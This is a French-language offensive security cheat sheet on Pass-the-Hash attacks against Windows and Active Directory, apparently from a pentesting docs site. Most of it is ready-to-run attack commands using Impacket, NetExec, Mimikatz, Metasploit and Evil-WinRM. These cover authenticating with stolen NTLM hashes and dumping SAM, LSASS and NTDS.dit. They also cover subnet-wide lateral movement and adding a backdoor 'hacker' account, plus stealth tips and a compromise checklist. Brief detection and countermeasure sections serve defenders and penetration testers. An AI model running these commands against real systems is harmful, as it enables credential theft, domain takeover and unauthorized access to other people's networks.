# Pass-the-Hash 

Le Pass-the-Hash (PtH) est une technique d'authentification qui exploite le protocole NTLM. Elle permet de s'authentifier sur un système distant en utilisant directement le **hash NTLM** d'un utilisateur, sans connaître son mot de passe en clair. Le hash est utilisé comme preuve d'identité, rendant inutile le cracking.



## Mécanisme

Dans le protocole NTLM, le mot de passe n'est jamais transmis en clair. Le client prouve son identité en chiffrant un challenge avec son hash NTLM. Un attaquant possédant ce hash peut donc rejouer l'authentification sans jamais connaître le mot de passe.
```
[Attaquant] → Authentification NTLM avec hash → [Cible]
[Cible]     → Challenge → [Attaquant]
[Attaquant] → Réponse chiffrée avec hash NTLM → [Cible]
[Cible]     → Accès accordé → [Attaquant]
```

### Conditions d'exploitation

- Posséder le hash NTLM d'un compte (local ou du domaine)
- Le compte doit avoir les droits nécessaires sur la cible
- NTLM doit être autorisé sur la cible
- Le compte ne doit pas être protégé par des restrictions (Protected Users, etc.)


## Prérequis

| Élément            | Détail                                             |
|--------------------|----------------------------------------------------|
| Accès requis       | Hash NTLM d'un compte local ou du domaine          |
| Format hash        | `LMHash:NTHash` ou `:NTHash`                       |
| Position réseau    | Accès aux ports 445 / 139 / 135 de la cible        |
| Outils nécessaires | Impacket / NetExec / Mimikatz / Metasploit         |



## Quick Attack

::: code-group
```bash [Impacket PSExec]
impacket-psexec domain/user@<target> -hashes :NTLMhash
```
```bash [Impacket WMIExec]
impacket-wmiexec domain/user@<target> -hashes :NTLMhash
```
```bash [NetExec]
nxc smb <target> -u user -H NTLMhash
```
```bash [Mimikatz]
sekurlsa::pth /user:user /domain:domain.com /ntlm:NTLMhash /run:cmd.exe
```

:::



## Workflow
```
1. Obtenir le hash NTLM (dump SAM / NTDS / LSASS)
2. Identifier les cibles accessibles avec ce hash
3. Choisir la méthode d'authentification (PSExec, WMI, SMB, etc.)
4. S'authentifier avec le hash
5. Exécuter des commandes / accéder aux ressources
6. Mouvement latéral vers d'autres cibles
```



## Collecte des Hashes NTLM

### Dump SAM (admin local)
```bash
# Via Impacket
impacket-secretsdump domain/user:password@<target>

# Via NetExec
nxc smb <target> -u user -p password --sam

# Via Mimikatz (local)
mimikatz # lsadump::sam
```

### Dump LSASS (hashes en mémoire)
```bash
# Via Mimikatz
mimikatz # sekurlsa::logonpasswords

# Via NetExec
nxc smb <target> -u user -p password -M lsassy

# Via Impacket
impacket-secretsdump domain/user:password@<target> -just-dc-user Administrator
```

### Dump NTDS.dit (contrôleur de domaine)
```bash
# Via Impacket
impacket-secretsdump domain/user:password@<DC> -just-dc-ntlm

# Via NetExec
nxc smb <DC> -u user -p password --ntds

# Via Mimikatz (sur le DC)
mimikatz # lsadump::dcsync /domain:domain.com /all
mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator
```



## Exploitation

###  Impacket PSExec
```bash
# Shell SYSTEM
impacket-psexec domain/user@<target> -hashes :NTLMhash

# Avec LM:NT
impacket-psexec domain/user@<target> -hashes LMhash:NTLMhash
```

###  Impacket WMIExec
```bash
# Shell interactif
impacket-wmiexec domain/user@<target> -hashes :NTLMhash

# Commande unique
impacket-wmiexec domain/user@<target> -hashes :NTLMhash -execute "whoami"
```

###  Impacket SMBExec
```bash
impacket-smbexec domain/user@<target> -hashes :NTLMhash
```

###  Impacket ATExec
```bash
impacket-atexec domain/user@<target> -hashes :NTLMhash "whoami"
```

### NetExec
```bash
# Vérifier l'accès
nxc smb <target> -u user -H NTLMhash

# Exécuter une commande
nxc smb <target> -u user -H NTLMhash -x "whoami"

# Sur tout un subnet
nxc smb 192.168.1.0/24 -u user -H NTLMhash

# Dump SAM avec le hash
nxc smb <target> -u user -H NTLMhash --sam
```

###  Mimikatz (Windows)
```bash
# Ouvrir un processus avec le hash
mimikatz # sekurlsa::pth /user:user /domain:domain.com /ntlm:NTLMhash /run:cmd.exe

# Admin local
mimikatz # sekurlsa::pth /user:Administrator /domain:. /ntlm:NTLMhash /run:cmd.exe
```

### Metasploit
```bash
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser user
set SMBPass :NTLMhash
set SMBDomain domain.com
run
```

###  xfreerdp (RDP)
```bash
# RDP avec hash (Restricted Admin Mode requis)
xfreerdp /u:user /d:domain.com /pth:NTLMhash /v:<target>
```

###  smbclient
```bash
smbclient //<target>/share -U domain/user --pw-nt-hash NTLMhash
```

###  Evil-WinRM
```bash
# Avec hash NTLM
evil-winrm -i <target> -u user -H NTLMhash

# Avec domaine
evil-winrm -i <target> -u user -H NTLMhash -d domain.com

# Avec scripts PowerShell
evil-winrm -i <target> -u user -H NTLMhash -s /path/to/scripts

# Avec binaires
evil-winrm -i <target> -u user -H NTLMhash -e /path/to/executables

# Avec SSL
evil-winrm -i <target> -u user -H NTLMhash -S
```

> Evil-WinRM nécessite que **WinRM soit actif** sur la cible (port **5985** HTTP ou **5986** HTTPS) et que le compte ait les droits **Remote Management**.


## Enumération des Cibles

### Identifier les machines accessibles avec le hash
```bash
# Sur tout un subnet
nxc smb 192.168.1.0/24 -u user -H NTLMhash

# Vérifier si admin local
nxc smb 192.168.1.0/24 -u user -H NTLMhash --local-auth
```

### Identifier les shares accessibles
```bash
nxc smb <target> -u user -H NTLMhash --shares
```

### Identifier les sessions actives
```bash
nxc smb <target> -u user -H NTLMhash --sessions
```



## Post-Exploitation

### Dump des secrets depuis la cible compromise
```bash
# Dump SAM
nxc smb <target> -u user -H NTLMhash --sam

# Dump LSA
nxc smb <target> -u user -H NTLMhash --lsa

# Dump LSASS
nxc smb <target> -u user -H NTLMhash -M lsassy
```

### Mouvement latéral
```bash
# PSExec vers une autre machine
impacket-psexec domain/user@<target2> -hashes :NTLMhash

# Propagation sur le réseau
nxc smb 192.168.1.0/24 -u user -H NTLMhash -x "net user hacker Password123! /add"
```

### Dump NTDS si DC compromis
```bash
impacket-secretsdump domain/Administrator@<DC> -hashes :NTLMhash -just-dc-ntlm
```



## Detection & IOC

### Event IDs Windows à surveiller

| Event ID | Description                                        |
|----------|----------------------------------------------------|
| 4624     | Logon réussi Type 3 (réseau) suspect             |
| 4625     | Logon échoué                                       |
| 4648     | Logon avec credentials explicites                  |
| 4776     | Validation credentials NTLM                        |
| 4672     | Privilèges spéciaux assignés au logon              |

### Indicateurs de compromission

- Authentifications NTLM de Type 3 depuis des sources inhabituelles
- Connexions SMB/WMI sans précédent sur des machines sensibles
- Utilisation de PSExec, WMIExec depuis des IPs inattendues
- Plusieurs authentifications réussies depuis la même source en peu de temps
- Activité sur des comptes inactifs ou de service



## Contre-mesures

- Activer **Protected Users Security Group** pour les comptes privilégiés
- Implémenter **Credential Guard** (Windows Defender)
- Désactiver **NTLM** et forcer Kerberos dans le domaine
- Activer la **signature SMB** (`RequireSecuritySignature`)
- Désactiver le **compte Administrateur local** ou utiliser **LAPS**
- Restreindre les droits d'admin local avec des GPO
- Monitorer les **Event IDs 4624 / 4648 / 4776**
- Segmenter le réseau pour limiter les mouvements latéraux
- Activer **Windows Defender ATP** pour détecter les outils offensifs



## Points d'attaque

- Hash NTLM identique sur plusieurs machines (réutilisation)
- Compte Administrateur local avec le même hash partout (absence de LAPS)
- NTLM encore autorisé dans le domaine
- Absence de signature SMB
- Comptes avec privilèges excessifs
- Credential Guard non activé
- Comptes de service avec droits d'admin local sur de nombreuses machines



::: tip

- Le format du hash pour Impacket est toujours `LMhash:NThash` utiliser `:NTLMhash` si le LM est vide
- `nxc smb 192.168.1.0/24 -u Administrator -H hash --local-auth` pour trouver toutes les machines avec le même admin local
- Prioriser le hash de **Administrateur local** souvent réutilisé sur tout le parc si LAPS est absent
- Combiner avec **DCSync** une fois le DC accessible pour dump tous les hashes du domaine
- `sekurlsa::pth` de Mimikatz est plus discret car il ne crée pas de nouveau processus réseau
- Vérifier si **Restricted Admin Mode** est activé pour le PtH en RDP

:::

::: details Checklist

- Hash NTLM obtenu (SAM / LSASS / NTDS)
- Format du hash vérifié (LM:NT ou :NT)
- Cibles accessibles identifiées via NetExec
- Accès admin local vérifié
- Shell obtenu via PSExec / WMIExec / SMBExec
- Secrets dumpés depuis les cibles compromises
- Mouvement latéral effectué
- NTDS dumpé si DC accessible
- IOC documentés

:::

## Tools

- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Metasploit](https://www.metasploit.com/)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [xfreerdp](https://github.com/FreeRDP/FreeRDP)



## Ressources

- [HackTricks Pass-the-Hash](https://book.hacktricks.xyz/windows-hardening/ntlm/pass-the-hash)
- [The Hacker Recipes PtH](https://www.thehacker.recipes/ad/movement/ntlm/pth)
- [PayloadsAllTheThings PtH](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#pass-the-hash)
- [Impacket GitHub](https://github.com/SecureAuthCorp/impacket)
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)



## Notes
```
# Notes terrain
```





<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/ad/pass-the-hash.md)</span>

</div>